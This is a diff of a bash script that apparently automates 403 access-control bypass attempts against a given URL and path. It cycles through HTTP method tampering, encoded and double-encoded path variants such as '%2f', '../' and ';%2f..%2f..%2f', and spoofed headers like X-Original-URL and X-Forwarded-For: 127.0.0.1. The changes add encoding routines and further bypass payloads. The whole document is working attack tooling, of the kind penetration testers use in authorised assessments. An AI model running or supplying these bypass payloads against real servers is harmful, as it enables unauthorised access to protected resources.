@@ -8,11 +8,11 @@ NC='\033[0m'  # No Color
 # Function to perform an HTTP request
 perform_request() {
     local url=$1
-    local method=$2
+    local method=${2:-GET}
     local headers=$3
 
     # Perform the curl request and capture HTTP code and size in one go
-    response=$(curl -k -s -o /dev/null -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -iL -w "%{http_code}","%{size_download}" -X "$method" -H "$headers" "$url")
+    response=$(curl -k -s -o /dev/null -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -iL -w "%{http_code},%{size_download}" -X "$method" -H "$headers" "$url")
     http_code=$(echo "$response" | cut -d',' -f1)
     size_download=$(echo "$response" | cut -d',' -f2)
 
@@ -20,12 +20,24 @@ perform_request() {
     if [ "$http_code" -eq 200 ]; then
         echo -e " $method ${GREEN}${http_code}${NC} ${size_download} --> $url $headers"
     else
-        echo -e " $method $http_code ${size_download} --> $url $headers"
+        echo -e " $method ${RED}${http_code}${NC} ${size_download} --> $url $headers"
     fi
 }
 
-# Handle Ctrl+C (SIGINT) gracefully
-trap 'echo -e "\n${RED}Interrupted by user! Exiting...${NC}"; exit 0;' SIGINT
+# URL encode a single character
+url_encode() {
+    local char="$1"
+    printf '%%%02X' "'$char"
+}
+
+# Double URL encode a character
+double_url_encode() {
+    local char="$1"
+    local encoded_char
+    encoded_char=$(url_encode "$char")  # First encoding
+    printf '%s' "$encoded_char" | sed 's/%/%25/g'  # Encode '%' into '%25'
+}
+
 
 # Main function
 main() {
@@ -34,6 +46,7 @@ main() {
 
     echo -e "$base_url $path\n"
 
+    # HTTP Method Bypass
     echo "[ HTTP METHOD BYPASS ]"
     methods=("TRACE" "HEAD" "POST" "PUT" "PATCH" "INVENTED" "HACK")
 
@@ -41,12 +54,31 @@ main() {
         perform_request "$base_url/$path" "$method"
     done
 
+    # URL Bypass
     echo -e "\n[ URL BYPASS ]"
+
+    # Extract the last character of the path
+    last_char="${path: -1}"
+    # URL encode the last character
+    encoded_last_char=$(url_encode "$last_char")
+    # Double URL encode the last character
+    double_encoded_last_char=$(double_url_encode "$last_char")
+    # Replace the last character of the path with the encoded and double-encoded characters
+    encoded_path="${path%?}$encoded_last_char"
+    double_encoded_path="${path%?}$double_encoded_last_char"
+
     urls=(
+        "$base_url/$encoded_path"
+        "$base_url/$double_encoded_path"
         "$base_url/$path"
+        "$base_url///$path"
+        "$base_url///$path/"
         "$base_url/./$path"
+        "$base_url/../$path"
         "$base_url/*/$path"
         "$base_url/%2f/$path"
+        "$base_url/$path%2f"
+        "$base_url/$path%252f"
         "$base_url/$path;%2f..%2f..%2f"
         "$base_url/%2e/$path"
         "$base_url/$path/."
@@ -65,10 +97,12 @@ main() {
         "$base_url/$path;/"
     )
 
+    # Perform the requests
     for url in "${urls[@]}"; do
         perform_request "$url"
     done
 
+    # Header Bypass
     echo -e "\n[ HEADER BYPASS ]"
     headers_list=(
         "X-Originating-IP: 127.0.0.1"
@@ -89,7 +123,6 @@ main() {
         "X-Original-URL: $path"
         "X-Custom-IP-Authorization: 127.0.0.1"
         "X-Forwarded-For: http://127.0.0.1"
-        "X-Forwarded-For: 127.0.0.1:80"
         "X-Rewrite-URL: $path"
         "X-Host: 127.0.0.1"
         "X-Forwarded-Host: 127.0.0.1"
@@ -97,7 +130,7 @@ main() {
     )
 
     for header in "${headers_list[@]}"; do
-        perform_request "$base_url/$path" "" "$header"
+        perform_request "$base_url/$path" "GET" "$header"
     done
 }
 
@@ -107,8 +140,5 @@ if [ "$#" -ne 2 ]; then
     exit 1
 fi
 
-base_url=$1
-path=$2
-
 # Call the main function
-main "$base_url" "$path"
+main "$1" "$2"
